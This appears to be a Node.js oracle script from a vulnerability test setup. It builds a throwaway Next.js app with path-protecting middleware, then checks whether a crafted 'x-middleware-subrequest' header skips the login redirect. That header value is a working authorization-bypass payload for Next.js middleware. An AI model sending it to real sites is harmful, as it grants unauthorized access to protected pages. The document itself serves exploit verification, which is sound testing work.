const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

(async () => {
  try {
    const marker = 'next-authz-bypass-' + Date.now() + '-' + Math.random().toString(16).slice(2);
    const appDir = path.join(os.tmpdir(), marker);
    fs.mkdirSync(appDir, { recursive: true });

    // Minimal middleware fixture exercising matcher-based protection.
    fs.writeFileSync(
      path.join(appDir, 'middleware.js'),
      "import { NextResponse } from 'next/server'\n" +
      "export function middleware(req) {\n" +
      "  if (req.nextUrl.pathname.startsWith('/protected')) {\n" +
      "    return NextResponse.redirect(new URL('/login', req.url), 307)\n" +
      "  }\n" +
      "  return NextResponse.next()\n" +
      "}\n" +
      "export const config = { matcher: ['/protected/:path*'] }\n"
    );

    fs.mkdirSync(path.join(appDir, 'pages', 'protected'), { recursive: true });
    fs.writeFileSync(path.join(appDir, 'pages', 'index.js'), "export default function Page(){return 'home'}\n");
    fs.writeFileSync(path.join(appDir, 'pages', 'login.js'), "export default function Page(){return 'login'}\n");
    fs.writeFileSync(path.join(appDir, 'pages', 'protected', 'area.js'), "export default function Page(){return 'secret'}\n");

    let next;
    try {
      next = require('next');
    } catch (e) {
      evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
      return finish();
    }

    if (typeof next !== 'function') {
      evidence = 'next_export_not_function';
      return finish();
    }

    const app = next({ dev: false, dir: appDir, conf: { distDir: '.next' } });
    let handler;
    try {
      await app.prepare();
      handler = app.getRequestHandler();
    } catch (e) {
      evidence = 'setup_exception:' + (e && e.message ? e.message : String(e));
      try { await app.close(); } catch (_) {}
      return finish();
    }

    async function simulate(pathname, subrequestHeader) {
      const req = {
        method: 'GET',
        url: pathname,
        headers: {
          host: 'example.test',
          connection: 'close'
        },
        socket: { encrypted: false },
        on() {},
        off() {},
        addListener() {},
        removeListener() {},
        once() {},
        emit() { return false; }
      };
      if (subrequestHeader) req.headers['x-middleware-subrequest'] = subrequestHeader;

      return await new Promise((resolve, reject) => {
        const res = {
          statusCode: 200,
          headers: {},
          setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
          getHeader(name) { return this.headers[String(name).toLowerCase()]; },
          hasHeader(name) { return Object.prototype.hasOwnProperty.call(this.headers, String(name).toLowerCase()); },
          removeHeader(name) { delete this.headers[String(name).toLowerCase()]; },
          writeHead(status, headers) {
            this.statusCode = status;
            if (headers && typeof headers === 'object') {
              for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
            }
          },
          write() {},
          end() { resolve({ statusCode: this.statusCode, headers: this.headers }); }
        };

        Promise.resolve(handler(req, res, pathname)).catch(reject);
      });
    }

    let benign;
    try {
      benign = await simulate('/protected/area', null);
    } catch (e) {
      evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
      try { await app.close(); } catch (_) {}
      return finish();
    }

    const benignLoc = benign && benign.headers ? benign.headers['location'] : undefined;
    if (!benignLoc || String(benignLoc).indexOf('/login') === -1) {
      evidence = 'benign_failed:no_redirect';
      try { await app.close(); } catch (_) {}
      return finish();
    }

    operation_completed = true;

    try {
      const malicious = await simulate('/protected/area', 'middleware:middleware:middleware:middleware:middleware');
      const attackLoc = malicious && malicious.headers ? malicious.headers['location'] : undefined;
      exploit_succeeded = !attackLoc;
      evidence = 'benign_redirect=1|attack_redirect=' + (attackLoc ? 1 : 0) + '|appDir=' + appDir;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
    }

    try { await app.close(); } catch (_) {}
    return finish();
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
    return finish();
  }
})();
